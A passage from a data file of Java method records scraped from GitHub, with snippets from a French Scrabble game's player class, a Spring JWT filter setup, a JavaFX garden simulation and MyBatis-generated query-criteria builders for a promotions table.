null, "modifiers": ["public"]}}, {"method_name": "terminerTour", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void terminerTour() {\t\tmonTour = false;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "nouveauScore", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void nouveauScore(int nouveauScoreObtenu) {\t\tscore = nouveauScoreObtenu;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "donneLettre", "params": ["ArrayList<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int donneLettre(ArrayList<Integer> nombreLettre) {\t\tif (nombreLettre.size() != 0) { // Si il'y a plus de lettres alors la somme de toute les cellules\t\t\t\t\t\t\t\t\t\t// du tableau \"nombreLettre\" est \u00e9gale a 0\t\t\tRandom rand = new Random();\t\t\tInteger index = rand.nextInt(nombreLettre.size());\t\t\tint value = nombreLettre.get(index); // enl\u00e8ve la lettre utiliser\t\t\tnombreLettre.remove((int) index);\t\t\treturn (97 + value); // code ASCII de a=97 \u00e0 z=122\t\t} else // Il n'y a pas de lettres\t\t\treturn 0; // (NULL)\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "echangerLettre", "params": ["int", "ArrayList<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Integer>", "snippet": "\tpublic ArrayList<Integer> echangerLettre(int index, ArrayList<Integer> nombreLettre) {\t\t// Retirez une lettre de la main du joueur et ajoutez-en une autre (si il y a\t\t// plus!)\t\tmain[index] = donneLettre(nombreLettre);\t\treturn nombreLettre;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "jeterLettre", "params": ["int", "ArrayList<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Integer>", "snippet": "\tpublic ArrayList<Integer> jeterLettre(int index, ArrayList<Integer> nombreLettre) {\t\tnombreLettre.add(main[index] - 97); // Lettre de retour \u00e0 la pile de dessins\t\tmain[index] = donneLettre(nombreLettre); // Dessine une autre lettre\t\treturn nombreLettre;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "calculerScore", "params": ["int", "int", "int", "Boolean", "Plateau"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int calculerScore(int[] mot, int xPos, int yPos, Boolean horizontal, Plateau plat) {\t\tint motScore = 0;\t\tint motMultiplicateur = 1;\t\tint counter = 0;\t\tif (horizontal) {\t\t\tfor (int i = yPos; i < (yPos + mot.length); ++i) {\t\t\t\t// Avancer horizontalement (axe Y uniquement)\t\t\t\tswitch (plat.returnBoite(xPos, i)) {\t\t\t\tcase 0:\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 1:\t\t\t\t\t// Boite bleu ciel (lettre x2)\t\t\t\t\t// Seule cette lettre est multipli\u00e9e par 2\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97] * 2;\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 2:\t\t\t\t\t// Boite bleu fonc\u00e9 (lettre x3)\t\t\t\t\t// Seule cette lettre est multipli\u00e9e par 3\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97] * 3;\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 3:\t\t\t\t\t// Boite rose (mot x2)\t\t\t\t\t// Le score du mot entier sera multipli\u00e9e par 2 plus tard\t\t\t\t\t// (score de la lettre individuelle n'est pas multiplier )\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tmotMultiplicateur *= 2;\t\t\t\t\tbreak;\t\t\t\tcase 4:\t\t\t\t\t// Boite rouge (mot x3)\t\t\t\t\t// Le score du mot entier sera multipli\u00e9e par 3 plus tard\t\t\t\t\t// (score de la lettre individuelle n'est pas multiplier )\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tmotMultiplicateur *= 3;\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\tmotScore += scoreLettre[mot[i - yPos] - 97];\t\t\t\t} // Fin du switch\t\t\t} // fin de la boucle\t\t} else {\t\t\tfor (int i = xPos; i < (xPos + mot.length); ++i) {\t\t\t\t// Avancer verticalement (axe X uniquement)\t\t\t\tswitch (plat.returnBoite(i, yPos)) {\t\t\t\tcase 0:\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 1:\t\t\t\t\t// Boite bleu ciel (lettre x2)\t\t\t\t\t// Seule cette lettre est multipli\u00e9e par 2\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97] * 2;\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 2:\t\t\t\t\t// Boite bleu fonc\u00e9 (lettre x3)\t\t\t\t\t// Seule cette lettre est multipli\u00e9e par 3\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97] * 3;\t\t\t\t\tcounter++;\t\t\t\t\tbreak;\t\t\t\tcase 3:\t\t\t\t\t// Boite rose (mot x2)\t\t\t\t\t// Le score du mot entier sera multipli\u00e9e par 2 plus tard\t\t\t\t\t// (score de la lettre individuelle n'est pas multiplier )\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tmotMultiplicateur *= 2;\t\t\t\t\tbreak;\t\t\t\tcase 4:\t\t\t\t\t// Boite rouge (mot x3)\t\t\t\t\t// Le score du mot entier sera multipli\u00e9e par 3 plus tard\t\t\t\t\t// (score de la lettre individuelle n'est pas multiplier )\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97];\t\t\t\t\tcounter++;\t\t\t\t\tmotMultiplicateur *= 3;\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\tmotScore += scoreLettre[mot[i - xPos] - 97];\t\t\t\t} // Fin de switch\t\t\t} // fin de la boucle\t\t}\t\t// Consid\u00e9rer la valeur multiplicative du mot entier\t\tmotScore *= motMultiplicateur;\t\tif (counter == 7) // Si toutes les lettres de votre main sont utilis\u00e9es, +50 points\t\t\tmotScore += 50;\t\treturn motScore;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<String>", "snippet": "\tpublic ArrayList<String> getMain() {\t\tArrayList<String> liste = new ArrayList<String>();\t\tfor (int a : main) {\t\t\tif (a != 0) {\t\t\t\tliste.add(Character.toString((char) a));\t\t\t}\t\t}\t\treturn liste;\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws InterruptedException {\t\tArrayList<Integer> nombreLettre = new ArrayList<Integer>(Arrays.asList(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\t\t\t\t0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)); // tout\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// l'alphabet\t\tJoueur jouer1 = new Joueur(\"Player 1\", nombreLettre);\t\tJoueur jouer2 = new Joueur(\"Player 2\", nombreLettre);\t\tSystem.out.println(\"Jouer 1\");\t\tfor (int i = 0; i < 7; i++)\t\t\tSystem.out.println(jouer1.verifierLettre(i));\t\tSystem.out.println(\"Jouer 2\");\t\tfor (int i = 0; i < 7; i++)\t\t\tSystem.out.println(jouer2.verifierLettre(i));\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/Joueur.java", "stars": "4", "class": {"name": "Joueur", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSessionFactory", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SessionFactory", "snippet": "    public SessionFactory getSessionFactory() {        return this.sessionFactory;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/core/src/main/java/com/nitro/core/database/DatabaseInstance.java", "stars": "2", "class": {"name": "DatabaseInstance", "extends": null, "implements": ["IDatabaseInstance"], "modifiers": ["public"]}}, {"method_name": "configure", "params": ["HttpSecurity"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void configure(HttpSecurity http) {        JWTFilter customFilter = new JWTFilter(tokenProvider);        http.addFilterBefore(customFilter, UsernamePasswordAuthenticationFilter.class);    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/security/jwt/JWTConfigurer.java", "stars": "2", "class": {"name": "JWTConfigurer", "extends": "SecurityConfigurerAdapter", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        SpringApplication.run(SecurityTestApplication.class, args);    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-test/src/main/java/com/yyj/securitytest/SecurityTestApplication.java", "stars": "2", "class": {"name": "SecurityTestApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initialize", "params": ["URL", "ResourceBundle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initialize(URL url, ResourceBundle rb) {        //Field initialization        flowers = new Field();        for (int i = 0; i < FLOWERS_START; i++) {            System.out.println(flowers.plantRandom());        }        //Window initialization        addMouseListener(field); //not yet used        //GameLoop initialization        loop();    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_field/WindowController.java", "stars": "2", "class": {"name": "WindowController", "extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"method_name": "loop", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void loop() {        GraphicsContext gc = field.getGraphicsContext2D();        final long startNanoTime = System.nanoTime();        //Game-Loop start        new AnimationTimer() {            @Override            public void handle(long currentNanoTime) {                //background                gc.clearRect(0, 0, field.getWidth(), field.getHeight());                //flowers                flowers.getFlowers().forEach((f) -> {                    Drawer2D.drawFlower(gc, f);                });            }        }.start();        //Days passing        new Timer().schedule(            new TimerTask() {                @Override                public void run() {                    Breeder.breed(flowers);                    //increment the textarea days                    int days_count = Integer.parseInt(days.getText());                    days.setText(++days_count + \"\");                }        }, 0, DAY_TIME);    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_field/WindowController.java", "stars": "2", "class": {"name": "WindowController", "extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"method_name": "addMouseListener", "params": ["Canvas"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void addMouseListener(Canvas c) {        c.setOnMouseClicked((MouseEvent event) -> {            System.out.println(event.getScreenX());            System.out.println(event.getScreenY());        });    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_field/WindowController.java", "stars": "2", "class": {"name": "WindowController", "extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"method_name": "plantRandom", "params": ["ActionEvent"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void plantRandom(ActionEvent event) {        flowers.plantRandom();    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_field/WindowController.java", "stars": "2", "class": {"name": "WindowController", "extends": null, "implements": ["Initializable"], "modifiers": ["public"]}}, {"method_name": "setOrderByClause", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderByClause(String orderByClause) {        this.orderByClause = orderByClause;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrderByClause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrderByClause() {        return orderByClause;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDistinct", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDistinct(boolean distinct) {        this.distinct = distinct;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDistinct", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDistinct() {        return distinct;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOredCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criteria>", "snippet": "    public List<Criteria> getOredCriteria() {        return oredCriteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": ["Criteria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void or(Criteria criteria) {        oredCriteria.add(criteria);    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria or() {        Criteria criteria = createCriteriaInternal();        oredCriteria.add(criteria);        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria createCriteria() {        Criteria criteria = createCriteriaInternal();        if (oredCriteria.size() == 0) {            oredCriteria.add(criteria);        }        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteriaInternal", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Criteria", "snippet": "    protected Criteria createCriteriaInternal() {        Criteria criteria = new Criteria();        return criteria;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {        oredCriteria.clear();        orderByClause = null;        distinct = false;    }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "PromoDOExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isValid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isValid() {            return criteria.size() > 0;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getAllCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getAllCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition) {            if (condition == null) {                throw new RuntimeException(\"Value for condition cannot be null\");            }            criteria.add(new Criterion(condition));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value, String property) {            if (value == null) {                throw new RuntimeException(\"Value for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value1, Object value2, String property) {            if (value1 == null || value2 == null) {                throw new RuntimeException(\"Between values for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value1, value2));        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNull() {            addCriterion(\"id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNotNull() {            addCriterion(\"id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdEqualTo(Integer value) {            addCriterion(\"id =\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotEqualTo(Integer value) {            addCriterion(\"id <>\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThan(Integer value) {            addCriterion(\"id >\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThanOrEqualTo(Integer value) {            addCriterion(\"id >=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThan", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThan(Integer value) {            addCriterion(\"id <\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThanOrEqualTo", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThanOrEqualTo(Integer value) {            addCriterion(\"id <=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIn(List<Integer> values) {            addCriterion(\"id in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotIn", "params": ["List<Integer>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotIn(List<Integer> values) {            addCriterion(\"id not in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdBetween(Integer value1, Integer value2) {            addCriterion(\"id between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotBetween", "params": ["Integer", "Integer"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotBetween(Integer value1, Integer value2) {            addCriterion(\"id not between\", value1, value2, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameIsNull() {            addCriterion(\"promo_name is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameIsNotNull() {            addCriterion(\"promo_name is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameEqualTo(String value) {            addCriterion(\"promo_name =\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameNotEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameNotEqualTo(String value) {            addCriterion(\"promo_name <>\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameGreaterThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameGreaterThan(String value) {            addCriterion(\"promo_name >\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameGreaterThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameGreaterThanOrEqualTo(String value) {            addCriterion(\"promo_name >=\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameLessThan", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameLessThan(String value) {            addCriterion(\"promo_name <\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameLessThanOrEqualTo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameLessThanOrEqualTo(String value) {            addCriterion(\"promo_name <=\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameLike(String value) {            addCriterion(\"promo_name like\", value, \"promoName\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/ryewen/quickbuy/master/src/main/java/com/loststars/quickbuy/dataobject/PromoDOExample.java", "stars": "1", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andPromoNameNotLike", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andPromoNameNotLike(String value) {            addCriterion(\"promo_name not like\", value, \"promoName\");            return 